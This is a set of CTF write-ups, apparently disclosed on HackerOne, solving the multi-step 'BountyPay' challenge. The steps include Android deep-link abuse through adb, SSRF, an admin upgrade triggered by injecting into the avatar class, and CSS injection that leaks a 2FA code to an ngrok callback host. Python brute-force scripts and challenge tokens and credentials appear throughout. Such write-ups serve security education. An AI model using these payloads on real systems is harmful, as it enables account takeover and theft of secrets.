From what I've gathered from the apk, I know I need to use a `X-Token: 8e9998ee3137ca9ade8f372739f062c1` on the api.
after trying to use it on every endpoint I knew, I began thinking that was not the good place. So I started to request every domain, and every endpoint previously found with that same header.

After seeing all of this didn't work, I went back to the apk to check what was the part that was doing a request to see if I missed something :

```java
public String performPostCall(String paramValue) {
        SharedPreferences settings = getSharedPreferences(KEY_USERNAME, 0);
        String token = "";
        String host = settings.getString("HOST", token);
        token = settings.getString("TOKEN", token);
        Log.d("HOST IS: ", host);
        Log.d("TOKEN IS: ", token);
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(host).openConnection();
            conn.setReadTimeout(10000);
            conn.setConnectTimeout(15000);
            conn.setRequestMethod("POST");
            conn.setDoInput(true);
            conn.setDoOutput(true);
            Builder builder = new Builder().appendQueryParameter("firstParam", paramValue);
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("X-Token: ");
            stringBuilder.append(paramValue);
            Log.d("HEADER VALUE AND HASH ", stringBuilder.toString());
            String query = builder.build().getEncodedQuery();
            if (query != null) {
                OutputStream os = conn.getOutputStream();
                BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                writer.write(query);
                writer.flush();
                writer.close();
                os.close();
                conn.connect();
            }
        } catch (IOException e) {
            StringBuilder stringBuilder2 = new StringBuilder();
            stringBuilder2.append("Post request did not send: ");
            stringBuilder2.append(e);
            Log.e("tag", stringBuilder2.toString());
        }
        return "hi";
    }
```
Sooo that request is using the right header, and it's directed at `api.bountypay.h1ctf.com`, so I thought I might use burp to see the response, so I did set up again my certificate on my emulator aaaaand :

{F859871} 

Nothing ...

I thought I wasn't hitting the right endpoint, so I went for a [frida](https://frida.re/) installation in order to get the URL used by the request at runtime.
I used the [log_string.js](https://github.com/iddoeldor/frida-snippets/blob/master/scripts/log_string_builders_and_string_compare.js) script to be able to see the strings used by the app directly at runtime, and I saw that I wasn't wrong during my static analysis thinking the url was really `api.bountypay.h1ctf.com`.

Let's get back to square 1, what did I miss ?

I went straight back to my gobuster to find an endpoint on the api I could have missed.

After not seeing anything different from the first results on the direct domain, I started to review every path I found previously on the app, specially the endpoint used for the account information previously `https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020` and I started to bruteforce using `/api/accounts` and `/api`.

Finally I got a hit ! `/api/staff` was found. That might be just what I'm looking for.
Went back to burp to send the request with the `X-Token` header set aaaaaaand :

{F859870} 

I was really disappointed, but I kept looking for another place.
After hours of searching on every other domain and on api, I went back to the `/api/staff` endpoint, and IT FINALLY WORKED !
When I issued the first request (screenshot above), there was a space between the `X-Token` and the `:`...
So I finally got what I'm looking for !
`[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]`
(I'm guessing the backend expects the exact string `X-Token: 8e9998ee3137ca9ade8f372739f062c1` and is not trimming for whitespaces the incoming string like backends would usually do)

Now I'm in possession of 2 staff_id, thats when I remembered there was a hint on Hackerone's twitter, linking to Bountypay's twitter, that was following a *Sandra Allison* with a badge picture.

{F859873} 

I now had 3 different names and staff_id :
* Sam Jenkins | STF:84DJKEIP38
* Brian Oliver | STF:KE624RQ2T9
* Sandra Allison | STF:8FJ3KFISL3

I instantly tried a POST request on the same endpoint, and got the response :
`400 ... ["Missing Parameter"]`

So I thought I needed to set either the name, the staff_id, or both. After trying for quite some time to try every different combination of those, either in json, or as a parameter string, I felt really disappointed again not to manage to get to the next step while I thought I had the right way of thinking.
After having tried every possible combination, I thought that this might be a Content-type issue, and started trying every combination and by specifying the content-type to either `application/json` with a json payload or `application/x-www-form-urlencoded` with a param string
This was the request that worked, with Sam Jenkins' staff_id :

{F859868} 

After trying every staff_id I had and finally got the answer I wanted :

`{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}`

Woohooo we're through this easy but painful part, that was mostly me making stupid mistakes and banging my heads on the wall.

# Step 6 - Luke, I am your admin ! 

## Abstract
Due to some poor choices in the application design, an attacker with a user access is able to escalate to admin only by using the application design.

## Impact
Privilege escalation from unprivileged user to admin

## Potential fix
Making sure every user input is properly sanitized would prevent this attack, but security by design recommends that the privileges management should not be handled on the client side of the application.  

## In-depth explanation
Let's use the username & password we just got to log in on `staff.bountypay.h1ctf.com`.

{F859869} 

The `home` template has 4 different tabs :

* Home
* Support tickets
* Profile
* Logout

Through navigating on the pages, I quickly found a js file that contained interestings functions.
it was named `website.js` and the code looks like :
```javascript
$(".upgradeToAdmin").click(function() {
    let t = $(input[name=username]).val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
})


$(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
})

$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
})

document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

I figured that what we wanted to do was to upgrade to admin, so I tried hitting the endpoint directly and got greeted by a 401 response :

{F859866} 

Okay, we need to find a way to make the admin request this for us then.

By looking at the other functions, there was a few more interesting stuff :
* Send a report about a page so an admin could check, even though it was specified that `Pages in the /admin directory will be ignored for security`
* The HTML anchors if containing tab1 to tab4 would trigger automatic click.

With that, I started to think that I had to make the admin click on something that would trigger me getting upgraded.

Let's get to it !

First, I wanted to try and make myself trigger a function by using an anchor, so I searched for where I could get some input, and the answer was on tab3 where you could change your avatar & your username, and the app would send you a new cookie containing your preferences.

{F859867} 

tampering with the username was not really interesting, but I noticed that changing the avatar was reflected in the avatar's class on the tickets page. What if I could change my avatar value to something like `tab3 sendReport` ? By requesting the tickets page with a `#tab3`, it would probably trigger a click on the tab3, resulting on a click on sendReport as well ?
Time to put the theory to a test :

I first requested to change my avatar to `tab3 sendReport`, and got this cookie :
`c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR1B3NVRQRFYrU2dnMzNuUWdXNk1ES1pXSDBXdTU4QlZPMS80UEh1WUJZdFoyVTlGa0IvbFdqUThBYjF6MFU0Q3cxcW9RbkdRVnE2OFd3UjZvQUFScFMveS92VURmZlFqdjZ1U1pSU3JlcHVQYXEzRUFFeFgwOGorMTcxcA%3D%3D`
Now, let's use this cookie and request :
`https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582#tab3`

and we get the alert !!!

{F859864} 

So cool ! Let's try with the upgradeToAdmin function ! But nothing happened ...

I went through the code one more time and figured that I needed to set the username for the function to work. Oh, it's getting kind of tricky... After searching for a few hours I figured it out, I need to use the login's page username !
but for that, I need to be able to send multiple template values in the url. Maybe an array could do the trick ?

`https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab3`

And nothing again...

I went back to square one, and re-read the code, re-tried everything... I couldn't understand, it should be working. 
After a good night of sleep, I went back to it and it was obvious, so obvious... I need to get the admin to click on my function ! not me !

sooo we need to send a report with that url as b64 and it should be working !

{F859865} 

And we get another cookie ! We're through !

Let's request the home again with that cookie and BOOM we are admin now. And we get access to a new tab containing creds :

{F859863} 

The user marten.mickos seems promising ! let's login with him on the app now.

We get the same 2FA we have had on step2, let's bypass it the same way using magic hashes.

We're on home as marten.mickos now. If we still remember how the challenge started, the goal was to deliver the May payments to hackers, so there will probably be a transaction if we request the statements for `05/2020`, and there is :

`"Transactions for 2020-05\",\"transactions\":[{\"id\":17538771,\"hash\":\"27cd1393c170e1e97f9507a5351ea1ba\",\"hackers\":272,\"programs\":84,\"reports\":270,\"amount\":\"$210,300\"}]}"}`

So now we need to get the payments done right ? in the `app.js` there is this code :
```javascript
$(".loadTxns").click(function() {
    let t = $('select[name="month"]').val(),
        e = $('select[name="year"]').val();
    $(".txn-panel").html(""), $.get("/statements?month=" + t + "&year=" + e, function(t) {
        if (t.hasOwnProperty("data")) {
            let e = JSON.parse(t.data);
            if (e.hasOwnProperty("transactions"))
                if (0 == e.transactions.length) $(".txn-panel").html('<div class="text-center" style="margin:10px">No Transactions To Process</div>');
                else {
                    let t = "";
                    t += '<table style="margin:0" class="table"><tr><th>Hacker(s)</th><th class="text-center">Program(s)</th><th class="text-center">Reports(s)</th><th class="text-center">Pay Out</th><th class="text-center">Action</th></tr>', $.each(e.transactions, function(e, s) {
                        t += "<tr><td>" + s.hackers + '</td><td class="text-center">' + s.programs + '</td><td class="text-center">' + s.reports + '</td><td class="text-center">' + s.amount + '</td><td class="text-center"><a href="/pay/' + s.id + "/" + s.hash + '" class="btn btn-sm btn-success">Pay</a></td></tr>'
                    }), t += "</table>", $(".txn-panel").html(t)
                }
            else alert("Invalid Response From The Server")
        } else alert("Invalid Response From The Server")
    })
});
```

So we need to call the `/pay/<id>/<hash>` endpoint to get our payments done !

{F859862} 

Oh no, still one more step to go... this 2FA looks like it won't be bypassed by a simple magic hash. Okay let's do it then !

# Final Step - CSS is harmless, unless ...?

## Abstract
The webpage is loading a CSS page from an non-sanitized source, resulting in a CSS injection that allows an attacker to retrieve enough parts of the 2FA code to be able to access a very sensitive function.

## Impact
Ability to use access a restricted area & sensitive function from an unauthorized attacker.

## Potential fix
Making sure every code loaded by the website is allowed, even if it's only CSS that isn't usually a danger.  

## In-depth explanation
At first I thought, maybe this was again a magic hash but that the application was verifying that the challenge & the time limit sent.
Just to make sure, I checked the same resolution method as the first 2FA (spoiler alert : it didn't work), and I wrote a quick & dirty python script (right below this paragraph) that requests the challenge multiple times until a `challenge` starts with Oe, meaning if this was a weak comparison again, I could just send a value contained in the magic hashes list to get an access. As I suspected that didn't work either.
```python
import requests
from bs4 import BeautifulSoup


url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'

post = {'app_style': 'https%3A%2F%2F4291e5a07787.ngrok.io%2Fselector.css'}
challenge = ''
while not challenge.startswith('0e'):
    x = requests.post(url_challenge, data = post, cookies = {"token": "eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"})
    soup = BeautifulSoup(x.text, 'html.parser')
    challs = soup.find_all("input")[0:2]
    for val in challs:
        print(val['value'])
        challenge=val['value']
```

I was left with the app_style field that was sent in the POST request and that contained a CSS file url :
`app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css`

I remembered reading about CSS injection in a [blog post](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d) from D0nut, but never exploited it before.
I read again the blog post, and figured the challenge answer I was looking for was probably pretty much like a csrf token, as an `input` div with `type=hidden`.

After hosting a CSS file containing basic payloads from the blog post, I was able to get a callback on a url, then I started thinking about how to get the name of the field I was searching for :

To try and get an idea on the name of the field, I used this css file :

```css
[id="code"i] {background:url("http://code.f4d745fe3bcf.ngrok.io");}
[id="otp"i] {background:url("http://otp.f4d745fe3bcf.ngrok.io");}
[id="2fa"i] {background:url("http://2fa.f4d745fe3bcf.ngrok.io");}
[id="challenge"i] {background:url("http://challenge.f4d745fe3bcf.ngrok.io");}
[id="challenge_answer"i] {background:url("http://challenge_answer.f4d745fe3bcf.ngrok.io");}
[id="token"i] {background:url("http://token.f4d745fe3bcf.ngrok.io");}
[id="totp"i] {background:url("http://totp.f4d745fe3bcf.ngrok.io");}
[name="code"i] {background:url("http://code.f4d745fe3bcf.ngrok.io");}
[name="otp"i] {background:url("http://otp.f4d745fe3bcf.ngrok.io");}
[name="2fa"i] {background:url("http://2fa.f4d745fe3bcf.ngrok.io");}
[name="challenge"i] {background:url("http://challenge.f4d745fe3bcf.ngrok.io");}
[name="challenge_answer"i] {background:url("http://challenge_answer.f4d745fe3bcf.ngrok.io");}
[name="token"i] {background:url("http://token.f4d745fe3bcf.ngrok.io");}
[name="totp"i] {background:url("http://totp.f4d745fe3bcf.ngrok.io");}
```

but I didn't get any callback on my listener, so I thought that the name was gonna be a bit more difficult to find.

I wrote yet another python script to help me get the name of the field I was searching for :

```python
import requests
from bs4 import BeautifulSoup

alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'
url_local = 'https://4291e5a07787.ngrok.io'
for c in alphabet:
    css_payload = 'input[name^=""] ~ * { background-image: url("https://4291e5a07787.ngrok.io/1/'+ c +'"); }'
    f = open("selector.css", "w")
    f.write(css_payload)
    f.close()
    post = {'app_style': 'https://4291e5a07787.ngrok.io/selector.css'}
    x = requests.post(url_challenge, data = post, cookies = {"token": "eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9"})
    print("testing : " + css_payload)
```

I made sure I was using the `~ *` css selector, and the `^=` to try character by character, like explained in the blog post to make sure I would get the right field even if there was a `type=hidden`.

I got to find that the name began by `code_`, and then something wieird happened, I got 6 characters, 1 to 6.

After verifying my results a few times, I came to the only possible conclusion, there must have been the fields `code_1` to `code_6` !

After that, I started using the same technique to get the value, but I found out quickly that the values were changing everytime, hence the 2 minutes timestamp.
so I figured I needed to create a css file containing every line I needed to get the value :
```python
import requests
from bs4 import BeautifulSoup

alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-+'
url_challenge = 'https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba'
url_local = 'https://4291e5a07787.ngrok.io'
for i in range(1,6):
    for c in alphabet:
        css_payload = 'input[name="code_' + i + '"][value^="' + c + '"] ~ * { background-image: url("https://4291e5a07787.ngrok.io/' + i + '/'+ c +'"); }' 
        f = open("selector.css", "a")
        f.write(css_payload + "\n")
        f.close()
```
you can see the final css file used attached as `selector.css`
since the input length on the HTML page was specifying that the input was 7 characters :
`<input name="challenge_answer" class="form-control" maxlength="7">`

It felt pretty obvious that I needed to bruteforce the 7 character, so I did setup a burp intruder to be able to quickly bruteforce the last character.
but then, for some obscure reason, I would get a random number of callbacks every time I would make the post request with my custom css.

I figured this might have been intended in order to force players to create a small api to automate the POST request and bruteforce when the request gets all 6 parts of the code.
Since I felt pretty lazy, I figured I would try to get it by manually launching my request and looking at the results log, and it took me under 15 minutes to get all 6 characters !
When I did get the 6 characters, I instantly sent the request to the burp intruder to bruteforce the last one aaaaaand :

{F859889} 

The final flag is :
`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`

In a little bit less than 4 days working on this ctf, I finally worked my way through it. It was really interesting, and the 2 last parts were really challenging, especially for me since I'm not really good with clientside bugs. As well, I'm used to CTF and it was nice having all the steps to complete one by one rather than a classic jeopardy style where challenges aren't connected one to another.

If you made it this far in the reading, I think you're a bit crazy, but I still thank you very much for it, and I hope you liked the ride.
Finally, I would like to say that I'm sorry for any wrong sentence or any misspelling, because english is not my main language.


Enzyro

## Impact

The attacker managed to get the payments done !

---

### [[H1-2006 2020] Bounty Pay CTF challenge](https://hackerone.com/reports/895798)

- **Report ID:** `895798`
- **Severity:** Critical
- **Weakness:** Improper Access Control - Generic
- **Program:** h1-ctf
- **Reporter:** @0xfd
- **Bounty:** - usd
- **Disclosed:** 2020-06-18T00:08:40.209Z
- **CVE(s):** -

**Vulnerability Information:**

# [H1-2006 2020] Bounty Pay CTF challenge

Hi there! This is my H1-2006 CTF writeup submission.
First of all, thanks for the great challenge!
This was my first H1 CTF that I played. I really enjoyed doing it and I learned new things solving this challenge.
In my case, it was the demonstration that I have decent knowledge about security :D 

## Summary:
I resumed the solution of the CTF in one image :) 

{F863480}

## Writeup:
All the history started with a simple HackerOne tweet which said that @martenmichkos needs help: 

{F863481}

After that, I started my road following the link in the tweet and I discovered that the target has a wildcard:
`*.bountypay.h1ctf.com`

So, I first searched on `https://crt.sh/?q=%25.bountypay.h1ctf.com` and that was all I needed to find some subdomains of the target: 

{F863483}

After saved the subdomains to one file, I ran [FFUF](https://github.com/ffuf/ffuf) with a small wordlist ([common.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/0a39d3dcb46c3f3412e7199d634c7cf52ef04c0b/Discovery/Web-Content/common.txt)) against them, with the objective to find hidden paths:

```sh
$ for subodomain in $(cat subdomains.txt); do ffuf -u "https://${subodomain}/FUZZ" -w common.txt -mc 200,301; done
```

At the first sight, one result won my total attention: `.git/HEAD` in `app.bountypay.h1ctf.com`, so I decided to try with another [common paths inside that folder](https://githowto.com/git_internals_git_directory) and... `.git/config` had public access too. 

{F863486}

After downloaded the file, I found a link to the repository which, for my luck it was public too. This one contained an only file that referred to another public php file on the same app.

{F863487}

That file, contained base64 encoded login credentials about a user logged in the page before, so.. **1FA successfull**

{F863488}

But then, I had another step, **bypass the 2FA challenge**. 
Analyzing the source I discovered that the form used to send the verification code had 4 parameters in the request: `username`, `password`, `challenge` and `challenge_answer`.
Three of them, I saw together before... in the log file. 

So, I decided to send the POST without the challenge value like the log, but it didn't work. Also, I tried just adding the code found in the file, but, no.
After checked the form again, I saw that the challenge input value has a MD5 format, so I tried to decrypt, but again, no luck. 
Then, I decided to do the inverse process, sending the challenge_answer value that I found in the log file and changing the challenge value to the md5 encryption of the answer... and works :)

- challenge_answer="bD83Jk27dQ" 
- challenge = md5("bD83Jk27dQ")

{F863490}

I had got full access control to an account in the BountyPay App :) 
 
Since there, the things went more interesting. 
After some times recognise the app I found two important things:
1. The app had an endpoint which return a list of user's statements. That data, was obtained by a request from the backend to the API. In the endpoint's response, I could see, the URL that was requested as well as the data it returned.
2. The token was an base64 encoded json which had a hash and an account_id.

So then, joining the findings...
I modified the account's value in the token and I realized that I could modify the request's path = **SSRF**

{F863495}

With this way, first I thought fuzz `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/*` but I didn't find something that helped me.
Then, I checked the results of my first fuzzing and check manually each subdomain that I found before. With this approach I realized two things:
1. `https:///api.bountypay.h1ctf.com` had an Open Redirect
2. `https:///software.bountypay.h1ctf.com` had IP Access Restriction

So... maybe I could apply something to use the redirect and get access to software.
Something... Something... Something... Path Traversal, of course! 
And it worked!

{F863509}

Because I only could make GET requests, try to bypass the login wasn't an option. 
So, I tried to bruteforce the software subdomain with burp intruder: 

{F863510}

Seeing the results, I got the url and I was able to download the apk file in `https://software.bountypay.h1ctf.com/uploads/bountypay.apk` 

{F863511}

For the Android APP, I use [jadx-gui](https://github.com/skylot/jadx) for decompile and [genymotion](https://www.genymotion.com/) + [adb](https://developer.android.com/studio/command-line/adb/?gclid=Cj0KCQjwiYL3BRDVARIsAF9E4GefdiEZsaDpxxw7mi_5dI6vRa6_PJ1mhj1QxpcPveu2K6ki2QuQCp8aArxZEALw_wcB&gclsrc=aw.ds) like always. 

So, I installed the app with adb: 

```sh
$ adb install BountyPay.apk
Performing Streamed Install
Success
```
and open the apk with the decompiler: 

```sh
$ jadx-gui BountyPay.apk 
```
With jadx I could see 5 activities: `MainActivity`, `PartOneActivity`, `PartTwoActivity`, `PartThreeActivity`, `CongratsActivity`. 

{F863513}

And in the `AndroidManifest.xml` I discovered 3 activities this could be accessed via deep links: 
- `PartOneActivity` via `one://part`
- `PartTwoActivity` via `two://part`
- `PartThreeActivity` via `three://part`

```xml
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="three" android:host="part"/>
    </intent-filter>
</activity>
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="two" android:host="part"/>
    </intent-filter>
</activity>
<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
    <intent-filter android:label="">
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="one" android:host="part"/>
    </intent-filter>
</activity>
```

I thought everything was resolved in that way, but before, I decided to watch the app dinamically.
So, first I created an user on the app: 

{F863515}

After that, when I arrived to the first activity, a hint popped up and it finished to confirm my doubts.

{F863516}

So, I went back to jadx to read some code source:

```java
public void onCreate(Bundle savedInstanceState) {
    ...
    if (!settings.contains("USERNAME")) {
    ...
            startActivity(new Intent(this, MainActivity.class));
        }
    if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")) {
        ...
        startActivity(new Intent(this, PartTwoActivity.class));
    }
```

Clearly, if I would send a deeplink with those params, I could escalate to the other fragment:
(And of course, I needed to be registed like I was already be)

I did that with an adb command:

```sh
adb shell am start -a android.intent.action.VIEW -d "one://part?start=PartTwoActivity" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity pkg=bounty.pay }
```

And I got access to the second activity: 

{F863517}

Again I went to jadx to see some codesource, and there I realized that I needed to solve the activity in two steps.
In the first one, I sent an Intent similar to the previous activity beacuse I want to show the components: 

```java
public void onCreate(Bundle savedInstanceState) {
    ...
    if (!settings.contains("USERNAME")) {
       ...
        startActivity(new Intent(this, MainActivity.class));
    }
    if (!settings.contains("PARTONE")) {
        ...
        startActivity(new Intent(this, MainActivity.class));
    }
    if (getIntent() != null && getIntent().getData() != null) {
        Uri data = getIntent().getData();
        String firstParam = data.getQueryParameter("two");
        String secondParam = data.getQueryParameter("switch");
        if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
            editText.setVisibility(0);
            button.setVisibility(0);
            textview.setVisibility(0);
        }
    }
}
```

```sh
adb shell am start -a android.intent.action.VIEW -d "two://part?switch=on\&two=light" bounty.pay
Starting: Intent { act=android.intent.action.VIEW dat=one://part?start=PartTwoActivity pkg=bounty.pay }
```

The lights came on:
{F863520}

For the second part of the activity, I decided not complicate the reversing process, so, [I setuped a debugger for smagli code](https://medium.com/@ghxst.dev/static-analysis-and-debugging-on-android-using-smalidea-jdwp-and-adb-b073e6b9ae48):
tl;dr; Basically you from the APK generate the smagli source code to attatch the Android Process and debug the apk. 

After the setup, I only needed to put a breakpoint and see the other value of the equal :) 

{F863524}

So then, I only wrote `X-Token` in the edit text and I went to the Third Activity. 

{F863525}

This last part was also consist in two steps: 
1. Send deeplink to change the visivility of some components: 

```java
public class PartThreeActivity extends AppCompatActivity {
...
private static final String KEY_USERNAME = "user_created";
...
final String directory = "aG9zdA==";
final String directoryTwo = "WC1Ub2tlbg==";
final String headerDirectory = "header";
...
    public void onCreate(Bundle savedInstanceState) {
        ...
        if (getIntent() != null && getIntent().getData() != null) {
            # Name of the parameters:
            String firstParam = data.getQueryParameter("three"); 
            String secondParam = data.getQueryParameter("switch");
            String thirdParam = data.getQueryParameter("header");
            byte[] decodeFirstParam = Base64.decode(firstParam, 0);
            byte[] decodeSecondParam = Base64.decode(secondParam, 0);
            final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);
            final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);
            final String str = firstParam;
            final String str2 = secondParam;
            ... 
            AnonymousClass5 r0 = new ValueEventListener() {
                public void onDataChange(DataSnapshot dataSnapshot) {
                    String str;
                    String value = (String) dataSnapshot.getValue();
                    if (str != null && decodedFirstParam.equals("PartThreeActivity") && str2 != null && decodedSecondParam.equals("on") && (str = secondParam2) != null) {
                        if (str.equals("X-" + value)) {
                            editText2.setVisibility(0);
                            button2.setVisibility(0);
                            PartThreeActivity.this.thread.start();
                        }
                    }
                }

                public void onCancelled(DatabaseError databaseError) {
                    Log.e("TAG", "onCancelled", databaseError.toException());
                }
            };
}   
```
From here I knew that I needed to send something similar to the previous activities which in this case were three parameters:

- three = Base64("PartThreeActivity")
- switch = Base64("on")
- header = "X-Token"

```sh
adb shell am start -a android.intent.action.VIEW -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk\=\&switch=b24\=\&header=X-Token" bounty.pay
```

After that, I could see the components of the activity and, in background the app started the process of generate a token for the API, which called to `getHost` and `getToken` methods: 
```java
    /* access modifiers changed from: private */
    public void getHost() {
        final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();
        this.childRef.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onDataChange(DataSnapshot dataSnapshot) {
                editor.putString("HOST", (String) dataSnapshot.getValue()).apply();
            }

            public void onCancelled(DatabaseError databaseError) {
                Log.e("TAG", "onCancelled", databaseError.toException());
            }
        });
    }

    /* access modifiers changed from: private */
    public void getToken() {
        final SharedPreferences.Editor editor = getSharedPreferences(KEY_USERNAME, 0).edit();
        this.childRefTwo.addListenerForSingleValueEvent(new ValueEventListener() {
            public void onDataChange(DataSnapshot dataSnapshot) {
                editor.putString("TOKEN", (String) dataSnapshot.getValue()).apply();
            }

            public void onCancelled(DatabaseError databaseError) {
                Log.e("TAG", "onCancelled", databaseError.toException());
            }
        });
    }
```
{F863526}
Note: The program that I used to show the log was [pidcat](https://github.com/JakeWharton/pidcat/) but it wasn't necesary to solve the challenge. I just used for the PoC.

Both methods stored the information on shared_preferencies, so I only needed to print the content of the xml file (`user_created.xml`).

```sh
$ adb shell cat /data/data/bounty.pay/shared_prefs/user_created.xml 
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="PARTTWO">COMPLETE</string>
    <string name="USERNAME">0xfd</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">_0xfd_</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map
```

To finish the Android Challenge step, I wrote the leaked token in the EditText, and... :

{F863528}

So now, I had directly access to `https://api.bountypay.h1ctf.com` just adding `X-Token: 8e9998ee3137ca9ade8f372739f062c1` in the request's header.

{F863529}

At this point I didn't have much idea how to continue the challenge, so I started fuzzing the API on `/*` and `/api/*` with the hope of find new paths. 
After several minutes, I found the `/api/staff` endpoint which returned me a list of staff users, so, I tried to bruteforce passwords on `https://staff.bountypay.h1ctf.com/?template=login` with those accounts, but it didn't work.
While the bruteforce process was running, I tried with others approachs, like change the HTTP method to POST, and with that I got an interesting response: `400 Bad Request ["Missing Parameter"]`.
For that, I understood that the next step of the challenge was for this way.
I tried with diferents approachs to send data (the same parameters that I recieved with the GET Method) via POST, until with `application/x-www-form-urlencoded`. I found another response `["Staff Member already has an account"]`.
That response was an approximation but something still missing to complete this step.
I tried diferent things like, send a random id but I got another error: `["Invalid Staff ID"]`. I was close, then I decided to leave the challenge for the moment and continue after.
The next day, thinking about the CTF, I remembered that H1 twitter account retweeted something about BountyPay.
I searched on the HackerOne Profile and found the tweet and the account of BountyPay, so I followed the account and search everywhere something that could help me to continue the challenge, and I found it! 
Between the followers I found Sandra, who according to BountyPay's Tweet, she was the new member of it's staff and also, for my luck, she tweeted an image with her staff code. 
In the moment that I saw the code, I ran to the PC and tried the endpoint with her code, and it worked!

{F863530}
{F863535}
{F863536}
{F863537}


So, now I had access to `https://staff.bountypay.h1ctf.com/` with a valid staff account. 

{F863538}

After some time spent in recognise the app I discover a few things: 
- The app is used to report pages and manage support tickets: The app had an enpoint which report a page to the Admin and that created a new support ticket.
- The app use Bootstrap 3.3.7
- I got a reflexion on the input `username` in the login template, **even when I'm already logged**.
- I can update two values of the user: her profile_name and her avatar. Both parameters filtered any char outside [0-9a-zA-Z ]. BUT **the avatar value was injected like css classes in the div**.
- The app has an **interesting js file**: 

 ```js 
 $('.upgradeToAdmin').click(function () {
  let t = $('input[name="username"]').val();
  $.get('/admin/upgrade?username=' + t, function () {
    alert('User Upgraded to Admin')
  })
}),
$('.tab').click(function () {
  return $('.tab').removeClass('active'),
  $(this).addClass('active'),
  $('div.content').addClass('hidden'),
  $('div.content-' + $(this).attr('data-target')).removeClass('hidden'),
  !1
}),
$('.sendReport').click(function () {
  $.get('/admin/report?url=' + url, function () {
    alert('Report sent to admin team')
  }),
  $('#myModal').modal('hide')
}),
document.location.hash.length > 0 && ('#tab1' === document.location.hash && $('.tab1').trigger('click'), '#tab2' === document.location.hash && $('.tab2').trigger('click'), '#tab3' === document.location.hash && $('.tab3').trigger('click'), '#tab4' === document.location.hash && $('.tab4').trigger('click'));
 ```
 
Joining the dots I could reach some conclusions: 
If I change the avatar value of my account to: `tab4%20upgradeToAdmin` and report a page which contains my avatar and imports that js and contain `#tab4` at the end of the location, I could upgrade my account to Admin. 
But I had a big problem, I needed an input which name was equal to username and with the value was equal to 'sandra.allison'. 
So, I decided to search between my burp history and I found an only ocurrence: the login. But unfortunatelly, that template didn't import the js that I needed. 
I got stuck a couple of days in this step, I searched for each CVE associated with the Bootstrap Version, some cases of HPP, searched some way to inject an iframe anywhere but nothing worked. 
Until one day, I sat at the computer, ready to try again all the cases that I had already tried before, and after a few hours... a HPP's payload that I didn't try finally worked!!!
